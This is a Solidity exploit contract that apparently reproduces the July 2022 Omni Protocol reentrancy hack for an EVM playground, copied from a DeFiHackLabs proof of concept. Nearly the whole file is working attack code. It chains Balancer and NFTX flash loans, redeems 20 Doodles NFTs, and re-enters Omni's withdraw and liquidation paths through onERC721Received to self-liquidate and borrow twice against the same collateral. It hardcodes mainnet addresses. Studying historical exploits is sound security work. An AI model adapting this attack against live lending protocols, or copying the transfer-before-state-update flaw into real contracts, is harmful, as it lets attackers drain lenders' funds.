// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-07-Omni).
//
// The DeFiHackLabs PoC (test/Omni_exp.sol) runs the ENTIRE attack INLINE in the
// Foundry test contract `ContractTest`: the Balancer `receiveFlashLoan` callback,
// the NFTX ERC-3156 `onFlashLoan` callback, AND the ERC-721 `onERC721Received`
// re-entrancy callback all live on the test itself, and it `new`s a `Lib`
// (borrower identity) mid-attack. There is no standalone exploit contract to
// deploy. This file is a faithful, self-contained copy of that inline attack so
// the playground can deploy it and record run(). Logic, constants, and the
// nonce-targeted callback branches are copied verbatim from test/Omni_exp.sol.
//
// Root cause (Omni Protocol, Ethereum, 2022-07-10): cross-function re-entrancy
// in an NFT money-market. withdrawERC721 / liquidationERC721 safeTransferFrom
// the underlying NFT to the recipient — firing onERC721Received — BEFORE the
// position's collateral/health state is finalised. The attacker re-enters to
// self-liquidate at a discount and to re-pledge the SAME 20 NFTs as fresh
// collateral for a second, larger WETH borrow, then withdraws all 20 NFTs out,
// leaving the pool with the debt and none of the collateral. Net ~63.26 ETH.

// VULNERABILITY note duplicated here for standalone: see interface IOmni above for full details on the flawed order inside supply/withdraw/liquidationERC721.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function withdraw(uint256) external;
}

interface IERC721 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external;
    function safeTransferFrom(address, address, uint256) external;
    function setApprovalForAll(address, bool) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface INFTXVault {
    function flashLoan(address receiver, address token, uint256 amount, bytes memory data) external returns (bool);
    function redeem(uint256 amount, uint256[] calldata specificIds) external returns (uint256[] calldata);
    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external returns (uint256);
}

interface ISushiRouter {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IOmni {
    // VULNERABILITY: Cross-function reentrancy in NFT money-market (identical root cause as the real Omni pool).
    // withdrawERC721 / liquidationERC721 execute safeTransferFrom of the Doodles NFT (firing receiver's onERC721Received) BEFORE finalising removal of the token from the user's collateral position, before healthFactor/erc721HealthFactor recalc, and before totalCollateral update.
    // This is a classic C-E-I violation; no reentrancy guard on the ERC721 paths.
    // Impact: Attacker can re-enter to self-liquidate at a discount + re-pledge the exact same NFTs for a second massive borrow, then withdraw the NFTs, leaving the pool holding large unbacked WETH debt (lenders lose the funds).
    struct ERC721SupplyParams {
        uint256 tokenId;
        bool useAsCollateral;
    }

    function supplyERC721(address asset, ERC721SupplyParams[] memory tokenData, address onBehalfOf, uint16 referralCode)
        external;
    function withdrawERC721(address asset, uint256[] memory tokenIds, address to) external returns (uint256);
    function liquidationERC721(
        address collateralAsset,
        address liquidationAsset,
        address user,
        uint256 collateralTokenId,
        uint256 liquidationAmount,
        bool receiveNToken
    ) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralBase,
            uint256 totalDebtBase,
            uint256 availableBorrowsBase,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor,
            uint256 erc721HealthFactor
        );
}

contract OmniExploit {
    // ---- victims / peripherals (mainnet, fork block 15_114_361) ----------------
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal constant DOODLE = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    INFTXVault internal constant DOODLE_VAULT = INFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    IBalancerVault internal constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC721 internal constant DOODLES = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
    ISushiRouter internal constant SUSHI_ROUTER = ISushiRouter(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IOmni internal constant POOL = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);

    // The Omni NToken (ERC-721 receipt) shares the Doodles address in this fork
    // (the Pool maps the asset to its nToken; the callback filters on msg.sender).
    address internal constant NTOKEN = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;

    // ERC-3156 callback return value (keccak256("ERC3156FlashBorrower.onFlashLoan")).
    bytes32 internal constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");
    // onERC721Received selector.
    bytes4 internal constant ERC721_RECEIVED = bytes4(0x150b7a02);

    // The 20 Doodles tokenIds redeemed from the NFTX vault (verbatim from the test).
    uint256[20] internal SPECIFIC_IDS =
        [4777, 4784, 2956, 7806, 4314, 7894, 9582, 1603, 4510, 6932, 1253, 6760, 9403, 1067, 179, 4017, 7165, 720, 5251, 7425];

    uint256 private nonce; // re-entrancy depth counter (drives the callback branches)
    Lib private lib; // the "borrower" identity deployed mid-attack

    // step 0: Balancer flash-loans 1,000 WETH; receiveFlashLoan → NFTX flash → … → profit.
    function run() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000 ether;
        // EXPLOIT STEP 1: Balancer flashloan of WETH (setup capital for acquiring NFTX shares).
        BALANCER.flashLoan(address(this), tokens, amounts, "");
    }

    // ---- Balancer flash-loan callback ----------------------------------------
    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        require(msg.sender == address(BALANCER), "You are not a market maker for Flash Loan!");
        DOODLE.approve(address(DOODLE), type(uint256).max);
        DOODLES.setApprovalForAll(address(DOODLE), true);
        // EXPLOIT STEP 2: NFTX flashloan of 20 DOODLE shares.
        DOODLE_VAULT.flashLoan(address(this), address(DOODLE), 20 ether, "");
    }

    // ---- NFTX ERC-3156 flash-loan callback — the meat of the attack -----------
    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        require(msg.sender == address(DOODLE), "You are not a market maker for Flash Loan!");

        WETH.approve(address(SUSHI_ROUTER), type(uint256).max);

        // Buy 1.2 DOODLE for the NFTX redeem fee.
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(DOODLE);
        // EXPLOIT STEP 3: Swap WETH->DOODLE shares on Sushi.
        SUSHI_ROUTER.swapTokensForExactTokens(12e17, 200 ether, path, address(this), block.timestamp);

        // Redeem the 20 specific Doodles NFTs.
        uint256[] memory ids = new uint256[](20);
        for (uint256 i = 0; i < 20; i++) {
            ids[i] = SPECIFIC_IDS[i];
        }
        // EXPLOIT STEP 4: redeem() from NFTX vault. 20x safeTransferFrom of Doodles triggers onERC721Received (nonce -> 20). We now own the raw NFTs.
        DOODLE_VAULT.redeem(20, ids);
        require(DOODLES.balanceOf(address(this)) >= 20, "redeem error.");

        // Deploy the borrower identity, hand it the NFTs, then run the re-entrancy.
        lib = new Lib();
        lib.approve();
        for (uint256 i = 0; i < 20; i++) {
            DOODLES.transferFrom(address(this), address(lib), SPECIFIC_IDS[i]);
        }
        // EXPLOIT STEP 5: joker() starts the first supply/borrow/withdraw that will reenter via callback.
        lib.joker();

        // After the nested callbacks return, withdraw all 20 NFTs back out.
        // EXPLOIT STEP 8: withdrawAll pulls the NFTs that were supplied during the reentrant attack().
        require(lib.withdrawAll(), "Withdraw Error.");

        // Re-mint the 20 Doodles into the NFTX vault to repay the DOODLE flash loan.
        uint256[] memory amounts = new uint256[](20);
        require(DOODLE_VAULT.mint(ids, amounts) == 20, "Error Amounts.");

        // Repay the Balancer 1,000 WETH flash loan.
        WETH.transfer(address(BALANCER), 1000 ether);

        // Unwrap the remaining WETH → ETH profit, kept in-contract.
        uint256 balance = WETH.balanceOf(address(this));
        WETH.withdraw(balance);

        return RETURN_VALUE;
    }

    // ---- ERC-721 re-entrancy callback — drives the nested attack payloads ------
    // Mirrors ContractTest.onERC721Received exactly: nonce-counts NFT receipts and
    // fires self-liquidation (nonce==21) then re-supply+borrow (nonce==22).
    // The receives come from pool's internal safeTransferFrom calls inside withdraw/liquidate.
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (msg.sender == NTOKEN) {
            if (nonce == 21) {
                // EXPLOIT STEP 6: Reentrancy #1 (during joker withdraw). Stale collateral state allows self-liquidation of 7425.
                nonce++;
                WETH.approve(address(POOL), type(uint256).max);
                POOL.liquidationERC721(address(DOODLES), address(WETH), address(lib), 7425, 100 ether, false);
                return ERC721_RECEIVED;
            } else if (nonce == 22) {
                // EXPLOIT STEP 7: Reentrancy #2 (from liquidation transfer). Move NFTs back to Lib and attack() = supply 20 + borrow max.
                uint256[3] memory three = [uint256(720), uint256(5251), uint256(7425)];
                for (uint256 i = 0; i < 3; i++) {
                    DOODLES.safeTransferFrom(address(this), address(lib), three[i]);
                }
                nonce = 1337;
                require(lib.attack(), "Attack Error!");
                return ERC721_RECEIVED;
            } else {
                nonce++;
                return ERC721_RECEIVED;
            }
        } else {
            return ERC721_RECEIVED;
        }
    }

    receive() external payable {}
}

// ---- Lib: the "borrower" identity (verbatim logic from the test) --------------
contract Lib {
    address private immutable exp;
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant DOODLE = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
    IERC721 private constant DOODLES = IERC721(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e);
    IOmni private constant POOL = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);
    address private constant NTOKEN = 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;

    constructor() {
        exp = msg.sender;
    }

    modifier onlyExp() {
        require(msg.sender == exp, "Not your biz!");
        _;
    }

    function approve() external onlyExp {
        DOODLES.setApprovalForAll(address(POOL), true);
        WETH.approve(address(POOL), type(uint256).max);
    }

    // joker: supply 3 NFTs (720, 5251, 7425), borrow 12.15 WETH, then withdraw 2 → re-enter.
    function joker() external onlyExp {
        IOmni.ERC721SupplyParams[] memory params = new IOmni.ERC721SupplyParams[](3);
        params[0] = IOmni.ERC721SupplyParams({tokenId: 720, useAsCollateral: true});
        params[1] = IOmni.ERC721SupplyParams({tokenId: 5251, useAsCollateral: true});
        params[2] = IOmni.ERC721SupplyParams({tokenId: 7425, useAsCollateral: true});
        // VULNERABILITY TRIGGER: supply then withdrawERC721 will callback before accounting is final.
        POOL.supplyERC721(address(DOODLES), params, address(this), 0);

        (,, uint256 amount,,,,) = POOL.getUserAccountData(address(this));
        POOL.borrow(address(WETH), amount, 2, 0, address(this));

        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 720;
        tokenIds[1] = 5251;
        // The withdrawERC721 here (called on POOL) is what fires the first reentrant onERC721Received while collateral state is not yet cleared.
        require(POOL.withdrawERC721(address(DOODLES), tokenIds, address(exp)) == 2, "Withdraw Error.");
    }

    // attack: re-supply ALL 20 NFTs, borrow 81 WETH (the deepest callback payload).
    function attack() external onlyExp returns (bool) {
        DOODLES.setApprovalForAll(address(POOL), true);
        IOmni.ERC721SupplyParams[] memory params = new IOmni.ERC721SupplyParams[](20);
        params[0] = IOmni.ERC721SupplyParams({tokenId: 4777, useAsCollateral: true});
        params[1] = IOmni.ERC721SupplyParams({tokenId: 4784, useAsCollateral: true});
        params[2] = IOmni.ERC721SupplyParams({tokenId: 2956, useAsCollateral: true});
        params[3] = IOmni.ERC721SupplyParams({tokenId: 7806, useAsCollateral: true});
        params[4] = IOmni.ERC721SupplyParams({tokenId: 4314, useAsCollateral: true});
        params[5] = IOmni.ERC721SupplyParams({tokenId: 7894, useAsCollateral: true});
        params[6] = IOmni.ERC721SupplyParams({tokenId: 9582, useAsCollateral: true});
        params[7] = IOmni.ERC721SupplyParams({tokenId: 1603, useAsCollateral: true});
        params[8] = IOmni.ERC721SupplyParams({tokenId: 4510, useAsCollateral: true});
        params[9] = IOmni.ERC721SupplyParams({tokenId: 6932, useAsCollateral: true});
        params[10] = IOmni.ERC721SupplyParams({tokenId: 1253, useAsCollateral: true});
        params[11] = IOmni.ERC721SupplyParams({tokenId: 6760, useAsCollateral: true});
        params[12] = IOmni.ERC721SupplyParams({tokenId: 9403, useAsCollateral: true});
        params[13] = IOmni.ERC721SupplyParams({tokenId: 1067, useAsCollateral: true});
        params[14] = IOmni.ERC721SupplyParams({tokenId: 179, useAsCollateral: true});
        params[15] = IOmni.ERC721SupplyParams({tokenId: 4017, useAsCollateral: true});
        params[16] = IOmni.ERC721SupplyParams({tokenId: 7165, useAsCollateral: true});
        params[17] = IOmni.ERC721SupplyParams({tokenId: 720, useAsCollateral: true});
        params[18] = IOmni.ERC721SupplyParams({tokenId: 5251, useAsCollateral: true});
        params[19] = IOmni.ERC721SupplyParams({tokenId: 7425, useAsCollateral: true});
        // EXPLOIT (reentrant): supply the full set of 20 (the same economic assets) and borrow against them again. Stale state from outer call allows this.
        POOL.supplyERC721(address(DOODLES), params, address(this), 0);

        (,, uint256 amount,,,,) = POOL.getUserAccountData(address(this));
        POOL.borrow(address(WETH), amount, 2, 0, address(this));
        return true;
    }

    // withdrawAll: pull all 20 NFTs back out, then forward the borrowed WETH to exploit.
    function withdrawAll() external onlyExp returns (bool) {
        uint256[] memory ids = new uint256[](20);
        ids[0] = 4777;
        ids[1] = 4784;
        ids[2] = 2956;
        ids[3] = 7806;
        ids[4] = 4314;
        ids[5] = 7894;
        ids[6] = 9582;
        ids[7] = 1603;
        ids[8] = 4510;
        ids[9] = 6932;
        ids[10] = 1253;
        ids[11] = 6760;
        ids[12] = 9403;
        ids[13] = 1067;
        ids[14] = 179;
        ids[15] = 4017;
        ids[16] = 7165;
        ids[17] = 720;
        ids[18] = 5251;
        ids[19] = 7425;
        // Final drain: because the reentrant supply's collateral was never correctly paired with the debt in accounting (due to transfer-before-update), we can withdraw the NFTs and keep the borrowed WETH.
        POOL.withdrawERC721(address(DOODLES), ids, address(exp));

        uint256 balance = WETH.balanceOf(address(this));
        WETH.transfer(address(exp), balance);
        return true;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return bytes4(0x150b7a02);
    }
}
